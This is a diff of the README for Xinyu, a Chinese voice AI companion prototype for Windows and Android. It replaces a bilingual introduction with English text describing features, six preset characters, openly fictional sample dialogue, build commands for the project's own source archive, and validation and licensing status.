@@ -1,69 +1,116 @@
 <div align="center">
 
-# 心屿 · Xinyu AI Companion
+<p><a href="./README.md"><kbd><b>English</b></kbd></a>&nbsp;&nbsp;<a href="./README.zh-CN.md"><kbd>简体中文</kbd></a></p>
 
-**给日常，留一点温柔。**  
-**A little warmth for your everyday life.**
+# Xinyu AI Companion
 
-让对话有声音，让陪伴有画面。中文语音陪伴原型，支持 Windows 桌面与 Android 源码。  
-A Chinese voice companion prototype with an immersive character view, Windows desktop code, and an Android client.
+### A little warmth for your everyday life.
 
-[完整源码 / Download source](./xinyu-ai-companion-sanitized-source.zip) · [快速开始 / Quick start](#快速开始--quick-start) · [参与贡献 / Contribute](https://github.com/fanalar/xinyu-ai-companion/issues)
+Conversations with a voice, companionship with a face, and memories you can edit.  
+A Chinese AI companion prototype for Windows desktop and Android.
+
+[**Get the complete source**](./xinyu-ai-companion-sanitized-source.zip) · [**Get started**](#getting-started) · [**Explore the conversations**](#a-conversation-worth-coming-back-to) · [**Share an idea**](https://github.com/fanalar/xinyu-ai-companion/issues)
 
 **MIT code · Windows 1.4.1 · Android source 1.3.4 · Personal beta**
 
-![沉浸陪伴示例 / Immersive companion demo](docs/showcase/immersive.jpg)
+![Immersive companion UI preview](docs/showcase/immersive.jpg)
 
 </div>
 
-## 一句“在忙什么呀”，开始今天的陪伴 / Start with “What are you up to?”
+## A place for the little things
 
-下班后想说说今天，睡前想有人听你讲两句，或只是想聊一件小事——心屿围绕角色、语音和日常记忆，探索更自然的陪伴体验。  
-Talk about your day, unwind before bed, or share a small moment. Xinyu explores companionship through characters, voice, and editable everyday memories.
+Not every conversation starts with a question. Sometimes you want to share a sunset on your way home, a small win from the day, or the thought that is keeping you awake.
 
-| 日常关心 / Everyday check-in | 晚安陪聊 / A quiet bedtime chat |
-|---|---|
-| ![日常示例对白 / Scripted daily conversation](docs/showcase/daily-chat.jpg) | ![晚安示例对白 / Scripted bedtime conversation](docs/showcase/goodnight-chat.jpg) |
-| “在忙什么呀？今天有没有想我一点点？” | “今天最开心的小事是什么？再小的事，我也想听。” |
-| “What are you up to? Have you missed me a little today?” | “What was your happiest little moment today? I’d love to hear it.” |
+Xinyu brings those everyday conversations into a space with a visible companion and spoken replies. Choose a character and relationship style, adjust their name, personality and voice, and switch between a character-focused view and a complete chat history. Keep the moments that matter as editable memories.
 
-*以上为虚构示例对白，在隔离数据中截图；展示相处语气，不代表真实用户记录、实际模型验收或后台主动推送。截图使用原项目展示素材，源码包默认采用占位图。*  
-*These are scripted, fictional conversations captured with isolated demo data. They illustrate tone, not real chats, live-model acceptance, or background notifications. Screenshots use project preview artwork; the source archive uses placeholders by default.*
+This is a work-in-progress Chinese companion prototype and an open source starting point for developers interested in voice interaction, character experiences and inspectable memory. It is designed for personal experimentation rather than a finished commercial service.
 
-## 你可以体验什么 / What you can explore
+## A conversation worth coming back to
 
-| 功能 / Feature | 体验 / Experience |
-|---|---|
-| 连续语音 / Continuous voice | 进入陪伴页开启收音，停顿后提交。外放模式在朗读时保护收音；耳机模式支持语音插话，外放可点击打断。 / Listen on entry and submit after a pause. Speaker mode gates capture during playback; headphone mode supports voice interruption, with manual interruption available on speakers. |
-| 沉浸陪伴 / Immersive view | 人物占据主要画面，透明字幕最多两行；随时切换完整聊天。 / A character-focused view with up to two subtitle lines and a full-chat view when needed. |
-| 六位伙伴 / Six companions | 选择角色，调整名字、个性、声音与相处方式。 / Choose a character and customize their name, personality, voice, and relationship style. |
-| 日常记忆 / Everyday memories | 独立伙伴记录、可编辑记忆和数据导出。 / Separate companion records, editable memories, and data export. |
-| 天气与资讯 / Weather & information | 日期、天气、新闻与公开资讯渠道；来源受可达性和限流影响。 / Date-aware weather, news, and public information lookup, subject to source availability and rate limits. |
-| 宠物小窝 / Pet corner | 把宠物互动加入日常陪伴。 / A pet interaction space alongside conversation. |
+### An everyday check-in
 
-## 遇见你的伙伴 / Meet your companions
+> **You:** I’ve just finished work. Finally, a moment to rest.  
+> **Wanwan:** What are you up to? Have you missed me a little today? Have a good meal first; I’m here for a quiet chat.
+
+![Scripted everyday check-in](docs/showcase/daily-chat.jpg)
+
+### A quiet conversation before bed
+
+> **You:** There is so much to do tomorrow. I’m having trouble sleeping.  
+> **Wanwan:** Let tomorrow wait for a moment. What was your happiest little moment today? However small it was, I’d love to hear it.
+
+![Scripted bedtime conversation](docs/showcase/goodnight-chat.jpg)
+
+These are **fictional, scripted examples** captured with isolated demo data. They illustrate an intended conversational tone; actual replies depend on the configured model and character settings. They are not real user chats, proof of live-model or acoustic performance, or evidence of background proactive messaging. Preview artwork is shown here; the source archive ships with placeholders. The current app UI is primarily Chinese; the buttons above switch this introduction only.
+
+## What makes up the experience?
+
+### 1. Keep the conversation going
+
+Entering the companion page attempts to enable microphone capture. Speech is submitted after a detected pause, allowing successive conversational turns. Text input remains available for quiet environments, shared spaces or devices without a microphone.
+
+Playback behavior is deliberate: **speaker mode gates capture while replies are spoken**, with a manual stop control for interruption. **Headphone mode supports spoken interruption** and cancellation of the previous reply. Recognition, pause timing and echo behavior still need evaluation on real devices.
+
+### 2. Give the character room to be present
+
+The immersive view puts the character at the center of the experience. Transparent subtitles display up to two lines, reducing long blocks of text over the portrait. Open the full conversation when you want to review, copy or search messages, or type a longer response.
+
+The two views serve different moments: immersion for the conversation you are having, and full chat for the information you want to revisit.
+
+### 3. Choose a companion and a relationship style
+
+Six preset companions provide different starting personalities. Their names, personalities, voices and relationship types can be adjusted. Explore a friend, confidant, romantic companion or everyday conversation partner, with separate records for different companions.
+
+### 4. Make memories inspectable
+
+Some things are worth remembering; others do not need to stay. Editable memories, separate companion records and data export let you review, correct or remove stored information.
+
+This is an inspectable local record mechanism, not a promise of perfect recall or understanding. Models can still miss context or produce inaccurate answers.
+
+### 5. Bring public information into the conversation
+
+Date, weather, news and public information lookup offer starting points for everyday topics. Results depend on source availability, publication dates, connectivity and rate limits. The app does not guarantee retrieval of arbitrary historical news or permanent access to every channel.
+
+### 6. Add a little pet companionship
+
+The pet corner provides a lighter interaction space alongside character conversations. Say hello to the bunny and explore how simple pet interactions can complement a daily companion experience.
+
+## Meet the companions
 
 <table>
 <tr>
-<td align="center"><img src="docs/showcase/f1.jpg" width="220" alt="清知 / Qingzhi"><br><b>清知 · Qingzhi</b><br>清冷知性 / Calm & thoughtful</td>
-<td align="center"><img src="docs/showcase/f2.jpg" width="220" alt="小野 / Xiaoye"><br><b>小野 · Xiaoye</b><br>甜酷元气 / Playful & spirited</td>
-<td align="center"><img src="docs/showcase/f3.jpg" width="220" alt="晚晚 / Wanwan"><br><b>晚晚 · Wanwan</b><br>温柔治愈 / Warm & gentle</td>
+<td align="center"><img src="docs/showcase/f1.jpg" width="220" alt="Qingzhi"><br><b>Qingzhi</b><br>Calm, thoughtful and quietly attentive</td>
+<td align="center"><img src="docs/showcase/f2.jpg" width="220" alt="Xiaoye"><br><b>Xiaoye</b><br>Playful, spirited and ready for everyday stories</td>
+<td align="center"><img src="docs/showcase/f3.jpg" width="220" alt="Wanwan"><br><b>Wanwan</b><br>Warm, gentle and easy to talk to</td>
 </tr>
 <tr>
-<td align="center"><img src="docs/showcase/m1.jpg" width="220" alt="砚清 / Yanqing"><br><b>砚清 · Yanqing</b><br>清冷学霸 / Quiet & intellectual</td>
-<td align="center"><img src="docs/showcase/m2.jpg" width="220" alt="阿野 / Aye"><br><b>阿野 · Aye</b><br>甜酷年下 / Lively & affectionate</td>
-<td align="center"><img src="docs/showcase/m3.jpg" width="220" alt="承屿 / Chengyu"><br><b>承屿 · Chengyu</b><br>成熟温柔 / Steady & caring</td>
+<td align="center"><img src="docs/showcase/m1.jpg" width="220" alt="Yanqing"><br><b>Yanqing</b><br>A quiet, intellectual conversation partner</td>
+<td align="center"><img src="docs/showcase/m2.jpg" width="220" alt="Aye"><br><b>Aye</b><br>Lively, affectionate and lighthearted</td>
+<td align="center"><img src="docs/showcase/m3.jpg" width="220" alt="Chengyu"><br><b>Chengyu</b><br>Steady, caring company for your day</td>
 </tr>
 </table>
 
-<p align="center"><img src="docs/showcase/bunny.png" width="180" alt="云仔兔兔 / Bunny companion"><br><b>云仔 · Bunny companion</b><br>聊聊日常，也给小兔一点陪伴。 / A little pet companionship, too.</p>
+<p align="center"><img src="docs/showcase/bunny.png" width="200" alt="Bunny companion"><br><b>Bunny companion</b><br>A little pet companionship alongside your conversations.</p>
 
-## 快速开始 / Quick start
+Artwork terms are separate from the code license. See the [preview media notice](docs/showcase/MEDIA_NOTICE.md).
 
-**完整可运行源码在 ZIP 中。网页源码目录仍在整理，请先解压源码包，不要直接构建目前的部分网页目录。**  
-**The complete source is in the ZIP archive. The browsable Git tree is still being organized; extract the archive before building.**
+## Where could you take it?
 
-需要 / Requirements: **Windows · Python 3.11 · Node.js 20+**。
+| Your interest | A starting point |
+|---|---|
+| Run a personal Chinese companion prototype | Download the source, choose a character and configure your own model |
+| Learn how voice conversations work | Explore capture, pause detection, playback gating and turn cancellation |
+| Design character and memory experiences | Adjust character settings and improve memory editing or export |
+| Improve news and weather lookup | Work on sources, date awareness, failures and result presentation |
+| Explore Android integration | Study the native recognition interface, WebView UI and device differences |
+
+## Getting started
+
+> **Extract the complete source archive first.** The browsable Git tree is still being organized. The ZIP contains the complete frontend, backend, build configuration and Android source; do not build the incomplete browsable tree directly.
+
+### Run the desktop development version
+
+Prepare **Windows, Python 3.11 and Node.js 20 or later**. The following commands use PowerShell:
 
 ```powershell
 Invoke-WebRequest "https://github.com/fanalar/xinyu-ai-companion/raw/refs/heads/main/xinyu-ai-companion-sanitized-source.zip" -OutFile source.zip
@@ -80,26 +127,98 @@ npm ci
 npm start
 ```
 
-在应用设置中填写自己的模型连接。语音识别需要按包内 README 下载 SenseVoice/Silero 模型；默认配置不包含任何实际密钥。  
-Configure your own model connection in Settings. Follow the archive README to download the SenseVoice/Silero speech models. No real API keys are bundled.
+In the app settings, configure your own model endpoint, model name and key. No real service keys are bundled. Model conversations require a working connection; some public information queries can be explored separately.
 
-**Android 源码 / Android source:** 包内 `android/`，需要 JDK 17、Android SDK 35；运行 `scripts/prepare_android_ui.py`、`scripts/fetch_speech_models.py --android` 和 `scripts/android_gradle.py assembleDebug`。详细准备步骤见包内 README。  
-The archive includes `android/`. Use JDK 17 and Android SDK 35; follow the included README for UI preparation, model downloads, and the debug build. No prebuilt APK or signing credentials are distributed here.
+### Prepare local speech models
 
-## 开放、可改造 / Open to your own ideas
+From the extracted source root:
 
-技术栈 / Stack: **Electron · React · FastAPI · SQLite · SenseVoice · Silero VAD**。
+```powershell
+backend/.venv/Scripts/python scripts/fetch_speech_models.py
+```
 
-欢迎改进语音识别与打断、新闻来源、角色交互、无障碍体验或英文界面。请在 Issue 中说明设备、复现步骤和预期效果，并移除私密聊天与密钥。  
-Contributions are welcome: voice recognition and interruption, news sources, character interactions, accessibility, or an English UI. Include your device, reproduction steps, and expected behavior in an issue, without private chats or credentials.
+The script downloads SenseVoice, Silero and required runtime resources. Models and libraries retain their upstream licenses. If a download fails, check the source and connectivity; the text UI can still be explored independently.
 
-## 当前状态与许可 / Status & licensing
+### Build a desktop installer
 
-- 个人内测原型，暂无收款或正式订阅。 / Personal beta prototype; no live billing or paid subscription.
-- 前端构建、隔离 API、安卓 Java 源码编译与密钥扫描通过；真实模型、真人声学与完整 APK 验收未完成。 / Frontend builds, isolated APIs, Android Java compilation, and secret scans passed. Live-model, real acoustic, and complete APK acceptance remain unverified.
-- 本地保存记录与配置；聊天及在线朗读会使用你配置的外部服务，服务可能收费。 / Records and configuration are stored locally; chat and online speech use external services, which may charge your account.
-- 代码 [MIT](./LICENSE)；展示图片与截图的素材说明见 [MEDIA_NOTICE](docs/showcase/MEDIA_NOTICE.md)，第三方模型遵循各自许可。 / Code is MIT; preview image terms are separate, and third-party models keep their own licenses.
-- 完整源码包 SHA-256：`462fe57b1a78b1af519e9f0e2a62cc49f9886dcd78ee5abe25cc38727f34012a`。
+After building the frontend, run:
 
-**如果这个方向对你有用，欢迎 Star，或提交一个具体建议。**  
-**If this direction is useful to you, leave a star or share a concrete suggestion.**
+```powershell
+backend/.venv/Scripts/python scripts/build_backend.py
+cd app
+npm run dist
+```
+
+This repository distributes source, not an accepted, signed installer. Your build still needs installation, upgrade, data-migration and real-device voice tests.
+
+### Build an Android debug package
+
+Prepare **JDK 17 and Android SDK 35**, configure the local SDK as described in the archive README, then run:
+
+```powershell
+cd android/frontend
+npm ci
+npm run build
+cd ../..
+python scripts/prepare_android_ui.py
+python scripts/fetch_speech_models.py --android
+python scripts/android_gradle.py assembleDebug
+```
+
+No operator key, signing material or prebuilt APK is included. Test microphone capture, audio routing and recognition on your intended phone.
+
+## Under the hood
+
+| Layer | Technology | Responsibility |
+|---|---|---|
+| Desktop shell | Electron | Desktop window, startup and packaging |
+| Interface | React | Character stage, chat, settings and memory pages |
+| Local service | FastAPI | Conversation, configuration, speech and public information endpoints |
+| Records | SQLite | Companions, messages and editable memories |
+| Speech recognition | SenseVoice, Silero VAD | Local recognition and voice activity detection |
+| Android client | Java, WebView | Mobile UI and native speech integration |
+
+Speech recognition can run locally. Model chat and online speech still use external services, so this is not an entirely offline application or a promise of unlimited free model access.
+
+## Frequently asked questions
+
+<details>
+<summary>Why does my first run look different from the previews?</summary>
+
+Previews use the original project's artwork; the source ZIP defaults to new SVG placeholders. An isolated preview copy starts with its microphone paused and adjusts portrait composition for the artwork. It is not a pixel-identical installer screenshot. Replace assets with images you are authorized to use.
+
+</details>
+
+<details>
+<summary>Why can I see text but not get a model reply?</summary>
+
+Recognition, model chat and speech playback are separate stages. Check the model endpoint, model name, key and network, then check whether the speech models were downloaded successfully. Do not post keys or complete private conversations in an issue.
+
+</details>
+
+<details>
+<summary>Are proactive messages or paid subscriptions available?</summary>
+
+The example conversations are not background proactive messages. This is a personal beta without live payments or a paid subscription service. Those directions can be discussed, but are not advertised as implemented features.
+
+</details>
+
+## Help shape the experience
+
+Start with one concrete improvement: microphone recognition, speaker-to-headphone switching, pauses that are too short or long, news dates and sources, editable memory, accessibility or interface localization.
+
+Open an [issue](https://github.com/fanalar/xinyu-ai-companion/issues) with your device, version, reproduction steps, expected result and actual result. Remove identifying information, credentials and private content from sample recordings or logs. Character-interaction ideas are welcome, too.
+
+If the direction is useful to you, **star the repository** so more people interested in voice and character companionship can find it.
+
+## Validation and licensing
+
+Frontend builds, isolated sample APIs, Android Java compilation and secret scans of the selected public source passed. Live-model, real acoustic, complete APK and long-session acceptance remain unverified. Illustrative screenshots and synthetic tests are not substitutes for those checks.
+
+Records and configuration are local. Chat and online speech can send content to your configured external services and may incur provider charges. Real private chats, live databases, keys and the original Git history are not included in the public source archive.
+
+Code is [MIT](./LICENSE). Artwork is covered separately by the [preview media notice](docs/showcase/MEDIA_NOTICE.md); models and dependencies retain their respective licenses.
+
+Source archive SHA-256: `462fe57b1a78b1af519e9f0e2a62cc49f9886dcd78ee5abe25cc38727f34012a`.
+
+<p align="center"><a href="./README.zh-CN.md"><kbd>切换到简体中文</kbd></a></p>
